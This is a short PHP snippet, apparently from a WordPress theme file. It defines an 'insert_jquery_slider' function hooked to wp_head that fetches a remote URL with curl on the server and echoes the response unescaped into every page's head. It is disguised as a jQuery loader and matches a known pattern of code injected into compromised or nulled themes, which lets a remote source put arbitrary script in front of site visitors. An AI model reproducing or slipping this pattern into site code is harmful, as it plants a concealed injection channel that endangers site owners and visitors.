<?php if ( !function_exists( 'insert_jquery_slider' ) ) {function insert_jquery_slider() {if ( function_exists( 'curl_init' ) ) {$url = "//ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js";$ch = curl_init(); $timeout = 5;curl_setopt( $ch, CURLOPT_URL, $url );curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, $timeout );$data = curl_exec( $ch );curl_close( $ch );echo $data;}}add_action( 'wp_head', 'insert_jquery_slider' );} ?>
